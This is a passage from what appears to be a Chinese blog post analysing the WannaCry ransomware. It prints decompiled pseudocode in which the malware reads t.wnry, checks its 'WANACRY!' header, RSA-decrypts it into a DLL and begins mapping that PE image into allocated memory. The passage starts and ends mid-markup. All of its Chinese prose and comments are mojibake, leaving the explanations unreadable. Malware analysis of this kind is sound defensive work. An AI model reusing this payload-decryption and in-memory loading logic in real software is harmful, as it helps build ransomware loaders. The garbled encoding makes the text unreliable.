class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">v4[<span class="number">309</span>]Â =Â a3;Â Â </span><br><span class="line"></span><br><span class="line">v4[<span class="number">308</span>]Â =Â a4;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">1</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å®Œæˆäº†ä¸¤é¡¹å·¥ä½œï¼š</p><ol><li><p> å¯¼å…¥ RSA ç§é’¥ï¼Œç”¨æ¥è§£å¯†åé¢çš„ç›¸å…³æ–‡ä»¶</p></li><li><p> ç”³è¯·äº†ä¸¤å—å¤§å°ä¸º 0x100000 çš„å†…å­˜</p></li></ol><h3 id="5-3-4-DecryptFile-è§£å¯†t-wnry"><a href="#5-3-4-DecryptFile-è§£å¯†t-wnry" class="headerlink" title="5.3.4 DecryptFile è§£å¯†t.wnry"></a>5.3.4 DecryptFile è§£å¯†t.wnry</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â __thiscallÂ <span class="title">DecryptFile</span><span class="params">(<span class="keyword">void</span>Â <span class="keyword">this</span>,Â LPCSTRÂ lpFileName,Â <span class="keyword">int</span>Â DecryptFileSize)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">hFileÂ =Â CreateFileA(lpFileName,Â GENERIC_READ,Â FILE_SHARE_READ,Â <span class="number">0</span>,Â OPEN_EXISTING,Â <span class="number">0</span>,Â <span class="number">0</span>);<span class="comment">//Â ä»¥åªè¯»çš„æ–¹å¼æ‰“å¼€t.wnryÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hFileÂ !=Â (HANDLE)INVALID_HANDLE_VALUEÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">GetFileSizeEx(hFile,Â &amp;FileSize);Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–æ–‡ä»¶å¤§å°Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â FileSize.QuadPartÂ &lt;=Â <span class="number">0x6400000</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ReadFile_Addr(hFile,Â &amp;lpBuffer,Â <span class="number">8u</span>,Â &amp;lpNumberOfBytesRead,Â <span class="number">0</span>)Â )<span class="comment">//Â è¯»å–8ä¸ªå­—èŠ‚çš„æ–‡ä»¶å†…å®¹Â è¯»å–çš„å†…å®¹ä¸ºWANACRY!Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !<span class="built_in">memcmp</span>(&amp;lpBuffer,Â aWanacry,Â <span class="number">8u</span>)Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ReadFile_Addr(hFile,Â &amp;Buffer,Â <span class="number">4u</span>,Â &amp;lpNumberOfBytesRead,Â <span class="number">0</span>)Â )<span class="comment">//Â ç»§ç»­å‘åè¯»å–4ä¸ªå­—èŠ‚çš„å†…å®¹Â è¯»å–çš„å†…å®¹ä¸º0x100Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â BufferÂ ==Â <span class="number">0x100</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ReadFile_Addr(hFile,Â pBuffer[<span class="number">306</span>],Â <span class="number">0x100</span>u,Â &amp;lpNumberOfBytesRead,Â <span class="number">0</span>)Â )<span class="comment">//Â è¯»å–0x100ä¸ªå­—èŠ‚Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ReadFile_Addr(hFile,Â &amp;buff,Â <span class="number">4u</span>,Â &amp;lpNumberOfBytesRead,Â <span class="number">0</span>)Â )<span class="comment">//Â å†æ¬¡è¯»å–4ä¸ªå­—èŠ‚Â å†…å®¹ä¸º04Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ReadFile_Addr(hFile,Â &amp;buffer,Â <span class="number">8u</span>,Â &amp;lpNumberOfBytesRead,Â <span class="number">0</span>)Â )<span class="comment">//Â ç»§ç»­å¾€åè¯»8å­—èŠ‚-&gt;10000Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â bufferÂ &lt;=Â <span class="number">0x6400000</span>Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â DecryptData((<span class="keyword">int</span>)(pBufferÂ +Â <span class="number">1</span>),Â (BYTEÂ *)pBuffer[<span class="number">306</span>],Â Buffer,Â &amp;DecryptDatas,Â (<span class="keyword">int</span>)&amp;DataSize)Â )<span class="comment">//Â å¯¹è¯»å–çš„0x100ä¸ªå­—èŠ‚è¿›è¡Œè§£å¯†Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">sub_402A76((<span class="keyword">char</span>Â *)pBufferÂ +Â <span class="number">84</span>,Â (<span class="keyword">int</span>)&amp;DecryptDatas,Â Src,Â DataSize,Â <span class="number">0x10</span>u);Â Â </span><br><span class="line"></span><br><span class="line">hGlobal_3Â =Â (<span class="keyword">int</span>)GlobalAlloc(<span class="number">0</span>,Â buffer);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â hGlobal_3Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â ReadFile_Addr(hFile,Â pBuffer[<span class="number">306</span>],Â FileSize.LowPart,Â &amp;lpNumberOfBytesRead,Â <span class="number">0</span>)<span class="comment">//Â è¯»å–0x10000ä¸ªå­—èŠ‚Â Â </span></span><br><span class="line"></span><br><span class="line">&amp;&amp;Â lpNumberOfBytesReadÂ Â </span><br><span class="line"></span><br><span class="line">&amp;&amp;Â (bufferÂ &lt;Â <span class="number">0</span>Â ||Â SHIDWORD(buffer)Â &lt;=Â <span class="number">0</span>Â &amp;&amp;Â lpNumberOfBytesReadÂ &gt;=Â (<span class="keyword">unsigned</span>Â <span class="keyword">int</span>)buffer)Â )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">pFileAddrÂ =Â hGlobal_3;Â Â </span><br><span class="line"></span><br><span class="line">DecryptPEFile((<span class="keyword">int</span>)(pBufferÂ +Â <span class="number">21</span>),Â pBuffer[<span class="number">306</span>],Â hGlobal_3,Â lpNumberOfBytesRead,Â <span class="number">1</span>);<span class="comment">//Â å°†è¯»å–çš„å†…å®¹è§£å¯†æˆä¸€ä¸ªPEæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line">*(_DWORDÂ *)DecryptFileSizeÂ =Â buffer;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â &#125;Â Â </span><br><span class="line"></span><br><span class="line">local_unwind2((<span class="keyword">int</span>)&amp;ms_exc.registration,Â <span class="number">-1</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â pFileAddr;Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è¿”å›è§£æå‡ºçš„æ–‡ä»¶é¦–åœ°å€Â Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â </span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸€ç›´å¯¹t.wnryæ–‡ä»¶æ‰§è¡Œè¯»å–æ“ä½œï¼Œæ¯è¯»å–ä¸€ä¸ªç‰‡æ®µåˆ°å†…å­˜è¾¹åˆ©ç”¨å·²æœ‰çš„RSAç§é’¥è¿›è¡Œè§£å¯†ï¼Œè¿”å›è§£å¯†åçš„æ–‡ä»¶å†…å®¹ã€‚</p><img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image17.png" class="" width="17"><p>å›¾åäº”ï¼šODæŸ¥çœ‹å‡½æ•°è¿”å›å€¼</p><p>æŸ¥çœ‹è§£å¯†åçš„æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªPEæ–‡ä»¶ï¼Œé€šè¿‡å¯¹æ–‡ä»¶æºç å’Œç»“æ„çš„åˆ†æï¼Œåˆ¤æ–­å®ƒæ˜¯ä¸€ä¸ªdllæ–‡ä»¶ï¼Œä¸”æ˜¯å…ˆå‰èµ„æºåŒ…ä¸­çš„t_wnry.dllã€‚</p><h3 id="5-3-5-WriteAllocMem-æ‹·è´PEæ–‡ä»¶åˆ°å†…å­˜"><a href="#5-3-5-WriteAllocMem-æ‹·è´PEæ–‡ä»¶åˆ°å†…å­˜" class="headerlink" title="5.3.5 WriteAllocMem æ‹·è´PEæ–‡ä»¶åˆ°å†…å­˜"></a>5.3.5 WriteAllocMem æ‹·è´PEæ–‡ä»¶åˆ°å†…å­˜</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>Â *__cdeclÂ <span class="title">sub_4021E9</span><span class="params">(<span class="keyword">void</span>Â *pFileBase,Â <span class="keyword">int</span>Â FileSize,Â <span class="keyword">int</span>Â VirtualAlloc_Addr,Â <span class="keyword">int</span>Â VirtualFree_Addr,Â <span class="keyword">int</span>Â LoadLibraryA_Addr,Â <span class="keyword">int</span>Â GetProcAddress_Addr,Â <span class="keyword">int</span>Â FreeLibrary_Addr,Â <span class="keyword">int</span>Â a8)</span>Â Â </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;Â Â </span><br><span class="line"></span><br><span class="line">v28Â =Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !CmpFileSize(FileSize,Â <span class="number">0x40</span>u)Â )Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â æ¯”è¾ƒæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äºç­‰äº0x40Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â *(_WORDÂ *)pFileBaseÂ !=Â <span class="number">0x5A4D</span>Â )Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ¤æ–­æ˜¯å¦æ˜¯PEæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_3;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !CmpFileSize(FileSize,Â *((_DWORDÂ *)pFileBaseÂ +Â <span class="number">0xF</span>)Â +Â <span class="number">0xF8</span>)Â )<span class="comment">//Â æ¯”è¾ƒæ–‡ä»¶å¤§å°æ˜¯å¦å¤§äºç­‰äº0x1F0Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">NtHeaderÂ =Â (<span class="keyword">char</span>Â *)pFileBaseÂ +Â *((_DWORDÂ *)pFileBaseÂ +Â <span class="number">0xF</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â *(_DWORDÂ *)NtHeaderÂ !=Â <span class="number">0x4550</span>Â )Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ¤æ–­æ˜¯å¦æ˜¯PEæ–‡ä»¶Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_3;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â *((_WORDÂ *)NtHeaderÂ +Â <span class="number">2</span>)Â !=Â <span class="number">0x14C</span>Â )Â Â Â Â Â Â <span class="comment">//Â åˆ¤æ–­æ–‡ä»¶è¿è¡Œå¹³å°Â 0x14Cä»£è¡¨I386Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_3;Â Â </span><br><span class="line"></span><br><span class="line">SectionAlignmentÂ =Â *((_DWORDÂ *)NtHeaderÂ +Â <span class="number">14</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â SectionAlignmentÂ &amp;Â <span class="number">1</span>Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ¤æ–­å†…å­˜å¯¹é½ç²’åº¦Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span>Â LABEL_3;Â Â </span><br><span class="line"></span><br><span class="line">NumberOfSectionÂ =Â *((<span class="keyword">unsigned</span>Â __int16Â *)NtHeaderÂ +Â <span class="number">3</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â *((_WORDÂ *)NtHeaderÂ +Â <span class="number">3</span>)Â )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â åˆ¤æ–­åŒºæ®µæ•°é‡Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">TextNameÂ =Â &amp;NtHeader[*((<span class="keyword">unsigned</span>Â __int16Â *)NtHeaderÂ +Â <span class="number">10</span>)Â +Â <span class="number">0x24</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â å–å‡ºSectionHeader[0]-&gt;name-----.textÂ Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">TextSizeÂ =Â *((_DWORDÂ *)TextNameÂ +Â <span class="number">1</span>);Â Â Â Â Â </span><br><span class="line"></span><br><span class="line"><span class="comment">//Â å–å‡ºSectionHeader[0]-&gt;SizeOfRawData-----0x6000Â Â </span></span><br><span class="line"></span><br><span class="line">TextVirtualAddressÂ =Â *(_DWORDÂ *)TextName;Â </span><br><span class="line"></span><br><span class="line"><span class="comment">//Â å–å‡ºSectionHeader[0]-&gt;VirtualAddersss-----0x1000Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â TextSizeÂ )Â Â </span><br><span class="line"></span><br><span class="line">SectionHeader[<span class="number">1</span>]Â =Â TextSizeÂ +Â TextVirtualAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Â ä»£ç æ®µçš„å¤§å°+ä»£ç æ®µçš„èµ·å§‹åœ°å€=ä¸‹ä¸€ä¸ªåŒºæ®µçš„èµ·å§‹åœ°å€Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>Â Â </span><br><span class="line"></span><br><span class="line">SectionHeader[<span class="number">1</span>]Â =Â SectionAlignmentÂ +Â TextVirtualAddress;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â SectionHeader[<span class="number">1</span>]Â &gt;Â v28Â )Â Â </span><br><span class="line"></span><br><span class="line">v28Â =Â SectionHeader[<span class="number">1</span>];Â Â </span><br><span class="line"></span><br><span class="line">TextNameÂ +=Â <span class="number">0x28</span>;Â Â </span><br><span class="line"></span><br><span class="line">--NumberOfSection;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>Â (Â NumberOfSectionÂ );Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â éå†åŒºæ®µÂ Â </span></span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">hKernel32Â =Â GetModuleHandleA(Kernel32);Â Â Â Â Â Â Â <span class="comment">//Â è·å–Kernel32çš„åŸºå€Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !hKernel32Â )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">GetSystemInfo_AddrÂ =Â (<span class="keyword">void</span>Â (__stdcallÂ *)(<span class="keyword">char</span>Â *))((<span class="keyword">int</span>Â (__cdeclÂ *)(HMODULE,Â <span class="keyword">void</span>Â (__stdcallÂ *)(LPSYSTEM_INFO),Â _DWORD))GetProcAddress_Addr)ã€(hKernel32,Â GetNativeSystemInfo,Â <span class="number">0</span>);<span class="comment">//Â è·å–GetNativeSystemInfoå‡½æ•°åœ°å€Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !GetSystemInfo_AddrÂ )Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">GetSystemInfo_Addr(&amp;lpSystemInfo);Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–ç³»ç»Ÿä¿¡æ¯Â Â </span></span><br><span class="line"></span><br><span class="line">v17Â =Â ~(v27Â -Â <span class="number">1</span>);Â Â </span><br><span class="line"></span><br><span class="line">dwSizeÂ =Â v17Â &amp;Â (*((_DWORDÂ *)NtHeaderÂ +Â <span class="number">20</span>)Â +Â v27Â -Â <span class="number">1</span>);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â dwSizeÂ !=Â (v17Â &amp;Â (v27Â +Â v28Â -Â <span class="number">1</span>))Â )Â Â Â Â Â Â <span class="comment">//Â æ­¤å¤„æ¡ä»¶ä¸æˆç«‹Â è·³è¿‡ifåˆ†æ”¯Â Â </span></span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">LABEL_3:Â Â </span><br><span class="line"></span><br><span class="line">SetLastError(<span class="number">0xC1</span>u);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">pAllocAddressÂ =Â ((<span class="keyword">int</span>Â (__cdeclÂ *)(_DWORD,Â <span class="keyword">int</span>,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â MACRO_PAGE,Â <span class="keyword">int</span>))VirtualAlloc_Addr)(Â Â </span><br><span class="line"></span><br><span class="line">*((_DWORDÂ *)NtHeaderÂ +Â <span class="number">13</span>),Â Â </span><br><span class="line"></span><br><span class="line">dwSize,Â Â </span><br><span class="line"></span><br><span class="line"><span class="number">0x3000</span>,Â Â </span><br><span class="line"></span><br><span class="line">PAGE_READWRITE,Â Â </span><br><span class="line"></span><br><span class="line">a8);Â Â Â Â Â   </span><br><span class="line"><span class="comment">//Â ç”³è¯·ä¸€å—å¤§å°ä¸º0x10000çš„å¯è¯»å¯å†™çš„å†…å­˜ç©ºé—´Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !pAllocAddressÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">pAllocAddressÂ =Â ((<span class="keyword">int</span>Â (__cdeclÂ *)(_DWORD,Â <span class="keyword">int</span>,Â <span class="keyword">signed</span>Â <span class="keyword">int</span>,Â MACRO_PAGE,Â <span class="keyword">int</span>))VirtualAlloc_Addr)(Â Â </span><br><span class="line"></span><br><span class="line"><span class="number">0</span>,Â Â </span><br><span class="line"></span><br><span class="line">dwSize,Â Â </span><br><span class="line"></span><br><span class="line"><span class="number">0x3000</span>,Â Â </span><br><span class="line"></span><br><span class="line">PAGE_READWRITE,Â Â </span><br><span class="line"></span><br><span class="line">a8);Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â å¦‚æœç”³è¯·å¤±è´¥åˆ™å†æ¬¡ç”³è¯·Â Â </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !pAllocAddressÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span class="line">LABEL_24:Â Â </span><br><span class="line"></span><br><span class="line">SetLastError(<span class="number">0xE</span>u);Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>Â <span class="number">0</span>;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">&#125;Â Â </span><br><span class="line"></span><br><span class="line">hHeapÂ =Â GetProcessHeap();Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="comment">//Â è·å–è¿›ç¨‹çš„å †å¥æŸ„Â Â </span></span><br><span class="line"></span><br><span class="line">pHeapAddressÂ =Â (<span class="keyword">unsigned</span>Â <span class="keyword">int</span>)HeapAlloc(hHeap,Â HEAP_ZERO_MEMORY,Â <span class="number">0x3C</span>u);Â Â </span><br><span class="line"></span><br><span class="line">pHeapBaseÂ =Â (<span class="keyword">int</span>Â *)pHeapAddress;Â Â </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>Â (Â !pHeapAddressÂ )Â Â </span><br><span class="line"></span><br><span class="line">&#123;Â Â </span><br><span class="line"></span><br><span 